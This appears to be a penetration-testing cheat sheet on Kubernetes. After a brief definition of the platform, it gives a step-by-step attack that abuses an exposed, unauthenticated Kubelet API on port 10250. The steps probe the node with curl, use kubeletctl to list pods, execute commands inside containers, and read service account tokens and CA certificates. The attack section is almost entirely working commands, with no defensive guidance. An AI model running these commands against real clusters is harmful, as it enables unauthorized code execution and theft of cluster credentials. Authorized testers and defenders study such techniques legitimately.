# Kubernetes (K8s)

* **Definition**: Open-source container orchestration platform.
* **Purpose**: Deploy, scale, and manage containerized applications.
* **Components**:
  * Control Plane: `API server`, `Scheduler`, `Controller Manager`, `etcd`
  * Worker Nodes (Minions): Run actual containers

Escalate privileges in a Kubernetes cluster by abusing the **Kubelet API** on port `10250` if it's **exposed and unauthenticated**

***

#### Step 1: Check if the Kubelet API is Exposed

```bash
curl -k https://<NODE_IP>:10250/pods

# If you get a JSON response → Kubelet is exposed.
# If you get “unauthorized” or a cert error → may need a token or client cert.
```

#### Step 2: Install kubeletctl (if not already installed)

```bash
go install github.com/cyberark/kubeletctl@latest
```

#### Step 3: List Running Pods

```bash
kubeletctl --server <NODE_IP>:10250 pods
```

#### Step 4: Try Remote Code Execution (RCE)

```bash
kubeletctl --server <NODE_IP>:10250 exec -p <POD_NAME> -c <CONTAINER_NAME> "id"
```

#### Step 5: Extract Service Account Token and CA Cert

```bash
kubeletctl --server <NODE_IP>:10250 exec -p <POD_NAME> -c <CONTAINER_NAME> "cat /var/run/secrets/kubernetes.io/serviceaccount/token"

kubeletctl --server <NODE_IP>:10250 exec -p <POD_NAME> -c <CONTAINER_NAME> "cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt"
```
